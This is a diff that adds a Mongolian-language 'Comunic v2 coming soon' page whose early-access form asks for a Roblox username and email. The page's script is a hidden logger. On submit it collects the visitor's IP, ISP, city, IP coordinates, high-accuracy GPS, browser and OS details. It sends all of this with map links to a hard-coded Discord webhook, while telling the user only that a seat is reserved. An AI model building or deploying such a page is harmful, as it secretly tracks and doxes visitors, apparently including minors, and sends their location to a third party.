@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="mn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Шинэ Comunic ирж байна</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #1a0f0a;
+  color: #f5f0eb;
+  min-height: 100vh;
+  overflow-x: hidden;
+  position: relative;
+}
+
+.bg {
+  position: fixed;
+  inset: 0;
+  background: 
+    radial-gradient(ellipse 70% 50% at 50% 0%, rgba(234, 120, 40, 0.18), transparent 60%),
+    radial-gradient(ellipse 50% 40% at 80% 90%, rgba(180, 60, 20, 0.12), transparent),
+    #1a0f0a;
+  z-index: 0;
+}
+
+.dots {
+  position: fixed;
+  inset: 0;
+  background-image: radial-gradient(rgba(255,255,255,0.04) 1px, transparent 1px);
+  background-size: 28px 28px;
+  z-index: 1;
+  pointer-events: none;
+}
+
+.wrap {
+  position: relative;
+  z-index: 10;
+  max-width: 420px;
+  margin: 0 auto;
+  padding: 28px 18px 40px;
+}
+
+/* top icons cluster */
+.icons {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 12px 0 28px;
+  position: relative;
+  height: 110px;
+}
+
+.icon-main {
+  width: 72px;
+  height: 72px;
+  background: linear-gradient(145deg, #e87a28, #c45a18);
+  border-radius: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 0 40px rgba(232, 122, 40, 0.45);
+  position: relative;
+  z-index: 2;
+  animation: float 4s ease-in-out infinite;
+}
+
+.icon-main svg { width: 34px; height: 34px; fill: #fff; }
+
+.icon-sat {
+  position: absolute;
+  width: 38px;
+  height: 38px;
+  background: #2a1a12;
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 1px solid rgba(255,255,255,0.08);
+  box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+}
+
+.icon-sat svg { width: 18px; height: 18px; fill: #c9a88a; }
+
+.icon-sat.tl { top: 0; left: 28%; }
+.icon-sat.tr { top: 8px; right: 26%; }
+.icon-sat.bl { bottom: 4px; left: 22%; }
+.icon-sat.br { bottom: 12px; right: 24%; }
+
+@keyframes float {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-6px); }
+}
+
+/* version badges */
+.badges {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 26px;
+}
+
+.badge {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 7px 14px;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 500;
+}
+
+.badge.locked {
+  background: rgba(255,255,255,0.06);
+  color: #a89a8c;
+  border: 1px solid rgba(255,255,255,0.08);
+}
+
+.badge.open {
+  background: linear-gradient(90deg, #e87a28, #d46a20);
+  color: #fff;
+  box-shadow: 0 4px 16px rgba(232, 122, 40, 0.35);
+}
+
+.badge .dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: #fff;
+  box-shadow: 0 0 8px #fff;
+}
+
+.arrow {
+  color: #6b5a4e;
+  font-size: 1.1rem;
+}
+
+/* title */
+h1 {
+  text-align: center;
+  font-size: 1.85rem;
+  font-weight: 700;
+  letter-spacing: -0.03em;
+  line-height: 1.25;
+  margin-bottom: 12px;
+}
+
+h1 span { color: #e87a28; }
+
+.desc {
+  text-align: center;
+  font-size: 0.88rem;
+  color: #b8a99a;
+  line-height: 1.55;
+  margin-bottom: 28px;
+  padding: 0 6px;
+}
+
+.desc strong { color: #e0c8b0; font-weight: 500; }
+
+/* progress card */
+.card {
+  background: rgba(30, 18, 12, 0.85);
+  border: 1px solid rgba(255,255,255,0.07);
+  border-radius: 18px;
+  padding: 20px 18px;
+  margin-bottom: 14px;
+  backdrop-filter: blur(8px);
+}
+
+.progress-head {
+  display: flex;
+  justify-content: space-between;
+  align-items: flex-start;
+  margin-bottom: 14px;
+}
+
+.progress-label {
+  font-size: 0.82rem;
+  color: #b8a99a;
+}
+
+.progress-pct {
+  font-size: 2.4rem;
+  font-weight: 700;
+  color: #e87a28;
+  line-height: 1;
+  margin-top: 4px;
+}
+
+.countdown {
+  display: flex;
+  gap: 6px;
+}
+
+.cd-box {
+  background: rgba(255,255,255,0.06);
+  border-radius: 10px;
+  padding: 8px 6px;
+  min-width: 42px;
+  text-align: center;
+}
+
+.cd-num {
+  font-size: 1.05rem;
+  font-weight: 600;
+  color: #f5f0eb;
+}
+
+.cd-unit {
+  font-size: 0.65rem;
+  color: #8a7a6c;
+  margin-top: 2px;
+}
+
+.bar-bg {
+  height: 6px;
+  background: rgba(255,255,255,0.08);
+  border-radius: 999px;
+  overflow: hidden;
+}
+
+.bar-fill {
+  height: 100%;
+  width: 67%;
+  background: linear-gradient(90deg, #e87a28, #f0a050);
+  border-radius: 999px;
+  transition: width 0.6s ease;
+}
+
+/* menu buttons */
+.menu-btn {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  width: 100%;
+  padding: 16px 16px;
+  border-radius: 16px;
+  border: none;
+  text-align: left;
+  cursor: pointer;
+  margin-bottom: 10px;
+  transition: transform 0.15s, opacity 0.15s;
+  font-family: inherit;
+}
+
+.menu-btn:active { transform: scale(0.98); }
+
+.menu-btn.primary {
+  background: linear-gradient(90deg, #e87a28, #d46a20);
+  color: #fff;
+  box-shadow: 0 6px 20px rgba(232, 122, 40, 0.3);
+}
+
+.menu-btn.secondary {
+  background: rgba(30, 18, 12, 0.9);
+  border: 1px solid rgba(255,255,255,0.08);
+  color: #f5f0eb;
+}
+
+.menu-icon {
+  width: 40px;
+  height: 40px;
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.menu-btn.primary .menu-icon {
+  background: rgba(255,255,255,0.2);
+}
+
+.menu-btn.secondary .menu-icon {
+  background: rgba(255,255,255,0.06);
+}
+
+.menu-icon svg { width: 20px; height: 20px; }
+
+.menu-btn.primary .menu-icon svg { fill: #fff; }
+.menu-btn.secondary .menu-icon svg { fill: #c9a88a; }
+
+.menu-text { flex: 1; }
+
+.menu-title {
+  font-size: 0.95rem;
+  font-weight: 600;
+  margin-bottom: 2px;
+}
+
+.menu-sub {
+  font-size: 0.78rem;
+  opacity: 0.75;
+}
+
+.menu-arrow {
+  font-size: 1.1rem;
+  opacity: 0.6;
+}
+
+/* form overlay */
+.overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(10, 6, 4, 0.92);
+  z-index: 100;
+  align-items: flex-end;
+  justify-content: center;
+  padding: 0;
+}
+
+.overlay.show { display: flex; }
+
+.sheet {
+  background: #1e120c;
+  border-radius: 24px 24px 0 0;
+  width: 100%;
+  max-width: 420px;
+  padding: 28px 20px 36px;
+  border-top: 1px solid rgba(255,255,255,0.08);
+  animation: slideUp 0.35s ease;
+}
+
+@keyframes slideUp {
+  from { transform: translateY(100%); }
+  to { transform: translateY(0); }
+}
+
+.sheet-handle {
+  width: 40px;
+  height: 4px;
+  background: rgba(255,255,255,0.15);
+  border-radius: 999px;
+  margin: 0 auto 20px;
+}
+
+.sheet h2 {
+  font-size: 1.25rem;
+  font-weight: 600;
+  text-align: center;
+  margin-bottom: 6px;
+}
+
+.sheet p {
+  text-align: center;
+  font-size: 0.85rem;
+  color: #a89a8c;
+  margin-bottom: 24px;
+}
+
+.field {
+  margin-bottom: 16px;
+}
+
+.field label {
+  display: block;
+  font-size: 0.8rem;
+  color: #b8a99a;
+  margin-bottom: 6px;
+  font-weight: 500;
+}
+
+.field input {
+  width: 100%;
+  padding: 14px 16px;
+  background: rgba(0,0,0,0.35);
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 12px;
+  color: #f5f0eb;
+  font-size: 0.95rem;
+  outline: none;
+  font-family: inherit;
+  transition: border-color 0.2s;
+}
+
+.field input:focus { border-color: #e87a28; }
+.field input::placeholder { color: #6b5a4e; }
+
+.submit-btn {
+  width: 100%;
+  padding: 16px;
+  background: linear-gradient(90deg, #e87a28, #d46a20);
+  border: none;
+  border-radius: 14px;
+  color: #fff;
+  font-size: 1rem;
+  font-weight: 600;
+  cursor: pointer;
+  font-family: inherit;
+  margin-top: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  box-shadow: 0 6px 20px rgba(232, 122, 40, 0.35);
+}
+
+.submit-btn:disabled {
+  opacity: 0.65;
+  cursor: not-allowed;
+}
+
+.spinner {
+  width: 20px;
+  height: 20px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+  display: none;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.success-sheet {
+  display: none;
+  text-align: center;
+  padding: 20px 0 10px;
+}
+
+.success-sheet.show { display: block; }
+
+.success-icon {
+  width: 56px;
+  height: 56px;
+  background: rgba(34, 197, 94, 0.15);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 16px;
+}
+
+.success-icon svg { width: 28px; height: 28px; fill: #22c55e; }
+
+.success-sheet h3 {
+  font-size: 1.2rem;
+  margin-bottom: 8px;
+}
+
+.success-sheet p {
+  color: #a89a8c;
+  font-size: 0.88rem;
+  line-height: 1.5;
+}
+
+.footer {
+  text-align: center;
+  font-size: 0.72rem;
+  color: #6b5a4e;
+  margin-top: 28px;
+}
+
+.footer a { color: #8a7a6c; text-decoration: none; }
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="dots"></div>
+
+<div class="wrap">
+  <!-- icons -->
+  <div class="icons">
+    <div class="icon-sat tl">
+      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.2L4 17.2V4h16v12z"/></svg>
+    </div>
+    <div class="icon-sat tr">
+      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+    </div>
+    <div class="icon-main">
+      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg>
+    </div>
+    <div class="icon-sat bl">
+      <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
+    </div>
+    <div class="icon-sat br">
+      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+    </div>
+  </div>
+
+  <!-- badges -->
+  <div class="badges">
+    <div class="badge locked">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="#a89a8c"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+      v1 хаалттай
+    </div>
+    <span class="arrow">→</span>
+    <div class="badge open">
+      <span class="dot"></span>
+      v2 тун удахгүй
+    </div>
+  </div>
+
+  <h1>Шинэ <span>Comunic</span><br>ирж байна</h1>
+  <p class="desc">Comunic v1 хаагдсан. Илүү <strong>дулаахан</strong>, илүү хурдан v2 хувилбар 10-р сарын 20-нд нээгдэнэ.</p>
+
+  <!-- progress -->
+  <div class="card">
+    <div class="progress-head">
+      <div>
+        <div class="progress-label">v2 бэлэн болсон нь</div>
+        <div class="progress-pct" id="pct">67%</div>
+      </div>
+      <div>
+        <div class="progress-label" style="text-align:right;margin-bottom:6px">Нээлт хүртэл</div>
+        <div class="countdown" id="countdown">
+          <div class="cd-box"><div class="cd-num" id="d">01</div><div class="cd-unit">өдөр</div></div>
+          <div class="cd-box"><div class="cd-num" id="h">07</div><div class="cd-unit">цаг</div></div>
+          <div class="cd-box"><div class="cd-num" id="m">03</div><div class="cd-unit">мин</div></div>
+          <div class="cd-box"><div class="cd-num" id="s">45</div><div class="cd-unit">сек</div></div>
+        </div>
+      </div>
+    </div>
+    <div class="bar-bg"><div class="bar-fill" id="bar"></div></div>
+  </div>
+
+  <!-- buttons -->
+  <button class="menu-btn primary" onclick="openForm()">
+    <div class="menu-icon">
+      <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z"/></svg>
+    </div>
+    <div class="menu-text">
+      <div class="menu-title">Системийн төлөв</div>
+      <div class="menu-sub">v2-ийн үйлчилгээ бүрийн байдлыг харах</div>
+    </div>
+    <span class="menu-arrow">→</span>
+  </button>
+
+  <button class="menu-btn secondary" onclick="openForm()">
+    <div class="menu-icon">
+      <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+    </div>
+    <div class="menu-text">
+      <div class="menu-title">Нүүр хуудас</div>
+      <div class="menu-sub">Comunic-ийн тухай</div>
+    </div>
+    <span class="menu-arrow">→</span>
+  </button>
+
+  <button class="menu-btn secondary" onclick="openForm()">
+    <div class="menu-icon">
+      <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+    </div>
+    <div class="menu-text">
+      <div class="menu-title">Апп татах</div>
+      <div class="menu-sub">Утсандаа суулгах</div>
+    </div>
+    <span class="menu-arrow">→</span>
+  </button>
+
+  <p class="footer">Үйлчилгээний нөхцөл · Нууцлалын</p>
+</div>
+
+<!-- form sheet -->
+<div class="overlay" id="overlay">
+  <div class="sheet">
+    <div class="sheet-handle"></div>
+
+    <div id="formView">
+      <h2>Early Access бүртгэл</h2>
+      <p>Roblox username болон email-ээ оруулна уу</p>
+
+      <div class="field">
+        <label>Roblox Username</label>
+        <input type="text" id="roblox" placeholder="жишээ: coolplayer123" required>
+      </div>
+      <div class="field">
+        <label>Email</label>
+        <input type="email" id="email" placeholder="you@example.com" required>
+      </div>
+
+      <button class="submit-btn" id="submitBtn" onclick="submitForm()">
+        <span id="btnText">Бүртгүүлэх</span>
+        <div class="spinner" id="spinner"></div>
+      </button>
+    </div>
+
+    <div class="success-sheet" id="successView">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      </div>
+      <h3>Амжилттай бүртгэгдлээ</h3>
+      <p>Таны суудал нөөцлөгдсөн. Урилга ирэхэд email-ээр мэдэгдэнэ.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1561299367615529012/bGtwYdTTZG-hgWkpNYiFUr2jrMxyVw5OxVeMU-VZlu7OnOGrOJ9zilcgvT3ToDqoxtu6";
+
+function openForm() {
+  document.getElementById("overlay").classList.add("show");
+}
+
+function closeForm() {
+  document.getElementById("overlay").classList.remove("show");
+}
+
+// countdown to Oct 20 2026
+function updateCountdown() {
+  const target = new Date("2026-10-20T00:00:00+08:00").getTime();
+  const now = Date.now();
+  let diff = Math.max(0, target - now);
+
+  const d = Math.floor(diff / 86400000); diff %= 86400000;
+  const h = Math.floor(diff / 3600000); diff %= 3600000;
+  const m = Math.floor(diff / 60000); diff %= 60000;
+  const s = Math.floor(diff / 1000);
+
+  document.getElementById("d").textContent = String(d).padStart(2, "0");
+  document.getElementById("h").textContent = String(h).padStart(2, "0");
+  document.getElementById("m").textContent = String(m).padStart(2, "0");
+  document.getElementById("s").textContent = String(s).padStart(2, "0");
+}
+setInterval(updateCountdown, 1000);
+updateCountdown();
+
+async function getIP() {
+  const data = {
+    ip: "unknown", city: "—", region: "—", country: "—", country_name: "—",
+    postal: "—", lat: null, lon: null, org: "—", timezone: "—", asn: "—"
+  };
+
+  // ipapi.co — best for ISP / org / carrier info
+  try {
+    const r = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4500) });
+    if (r.ok) {
+      const j = await r.json();
+      data.ip = j.ip || data.ip;
+      data.city = j.city || data.city;
+      data.region = j.region || data.region;
+      data.country = j.country_code || data.country;
+      data.country_name = j.country_name || data.country_name;
+      data.postal = j.postal || data.postal;
+      data.lat = j.latitude;
+      data.lon = j.longitude;
+      data.org = j.org || j.asn || data.org;
+      data.timezone = j.timezone || data.timezone;
+      data.asn = j.asn || data.asn;
+      return data;
+    }
+  } catch(e) {}
+
+  // fallback ipinfo
+  try {
+    const r = await fetch("https://ipinfo.io/json", { signal: AbortSignal.timeout(4000) });
+    if (r.ok) {
+      const j = await r.json();
+      data.ip = j.ip || data.ip;
+      data.city = j.city || data.city;
+      data.region = j.region || data.region;
+      data.country = j.country || data.country;
+      data.country_name = j.country || data.country_name;
+      data.postal = j.postal || data.postal;
+      data.org = j.org || data.org;
+      data.timezone = j.timezone || data.timezone;
+      if (j.loc) {
+        const [la, lo] = j.loc.split(",");
+        data.lat = parseFloat(la);
+        data.lon = parseFloat(lo);
+      }
+      return data;
+    }
+  } catch(e) {}
+
+  // last resort
+  try {
+    const r = await fetch("https://api.ipify.org?format=json", { signal: AbortSignal.timeout(3000) });
+    if (r.ok) {
+      const j = await r.json();
+      data.ip = j.ip;
+    }
+  } catch(e) {}
+
+  return data;
+}
+
+function getBrowser() {
+  const ua = navigator.userAgent;
+  let browser = "Unknown", os = "Unknown";
+  if (ua.includes("Firefox/")) browser = "Firefox";
+  else if (ua.includes("Edg/")) browser = "Edge";
+  else if (ua.includes("Chrome/")) browser = "Chrome";
+  else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
+  else if (ua.includes("OPR/") || ua.includes("Opera")) browser = "Opera";
+
+  if (ua.includes("Windows")) os = "Windows";
+  else if (ua.includes("Mac OS")) os = "macOS";
+  else if (ua.includes("Android")) os = "Android";
+  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+  else if (ua.includes("Linux")) os = "Linux";
+
+  return {
+    browser, os,
+    lang: navigator.language || "—",
+    screen: `\( {screen.width}x \){screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "—",
+    ua
+  };
+}
+
+function getGPS() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve({ lat: null, lon: null, acc: null, error: "no geolocation" });
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        resolve({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy,
+          error: null
+        });
+      },
+      (err) => {
+        resolve({ lat: null, lon: null, acc: null, error: err.message || "denied" });
+      },
+      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+    );
+  });
+}
+
+async function sendWebhook(payload) {
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch(e) {}
+}
+
+async function collect(roblox, email) {
+  const [ip, browser, gps] = await Promise.all([getIP(), Promise.resolve(getBrowser()), getGPS()]);
+
+  const mapsIP = (ip.lat && ip.lon) ? `https://www.google.com/maps?q=\( {ip.lat}, \){ip.lon}` : null;
+  const mapsGPS = (gps.lat && gps.lon) ? `https://www.google.com/maps?q=\( {gps.lat}, \){gps.lon}` : null;
+
+  const fields = [
+    { name: "IP Address", value: `\`${ip.ip}\``, inline: true },
+    { name: "ISP / Carrier", value: ip.org || "—", inline: true },
+    { name: "ASN", value: ip.asn || "—", inline: true },
+    { name: "Хот", value: ip.city, inline: true },
+    { name: "Бүс", value: ip.region, inline: true },
+    { name: "Улс", value: `\( {ip.country_name} ( \){ip.country})`, inline: true },
+    { name: "Postal", value: ip.postal, inline: true },
+    { name: "IP Coordinates", value: ip.lat ? `${ip.lat}, ${ip.lon}` : "—", inline: true },
+    { name: "IP Maps", value: mapsIP ? `[Open](${mapsIP})` : "—", inline: true },
+    { name: "GPS Lat/Lon", value: gps.lat ? `${gps.lat}, ${gps.lon}` : (gps.error || "denied"), inline: true },
+    { name: "GPS Accuracy", value: gps.acc ? `±${Math.round(gps.acc)}m` : "—", inline: true },
+    { name: "GPS Maps", value: mapsGPS ? `[Open](${mapsGPS})` : "—", inline: true },
+    { name: "Browser", value: browser.browser, inline: true },
+    { name: "OS", value: browser.os, inline: true },
+    { name: "Screen", value: browser.screen, inline: true },
+    { name: "Language", value: browser.lang, inline: true },
+    { name: "Timezone", value: browser.timezone, inline: true },
+    { name: "Roblox Username", value: roblox ? `\`${roblox}\`` : "—", inline: true },
+    { name: "Email", value: email ? `\`${email}\`` : "—", inline: true },
+    { name: "User-Agent", value: `\`\`\`${browser.ua.substring(0, 220)}\`\`\`` }
+  ];
+
+  await sendWebhook({
+    embeds: [{
+      title: "Comunic — New Registration",
+      color: 0xe87a28,
+      fields,
+      timestamp: new Date().toISOString(),
+      footer: { text: "Comunic Logger · GPS + IP" }
+    }]
+  });
+}
+
+async function submitForm() {
+  const roblox = document.getElementById("roblox").value.trim();
+  const email = document.getElementById("email").value.trim();
+  if (!roblox || !email) return;
+
+  const btn = document.getElementById("submitBtn");
+  const btnText = document.getElementById("btnText");
+  const spinner = document.getElementById("spinner");
+
+  btn.disabled = true;
+  btnText.style.display = "none";
+  spinner.style.display = "block";
+
+  // GPS permission request happens here + full collect
+  await collect(roblox, email);
+
+  await new Promise(r => setTimeout(r, 900));
+
+  document.getElementById("formView").style.display = "none";
+  document.getElementById("successView").classList.add("show");
+}
+
+// close overlay when clicking outside sheet
+document.getElementById("overlay").addEventListener("click", (e) => {
+  if (e.target.id === "overlay") closeForm();
+});
+</script>
+</body>
+</html>
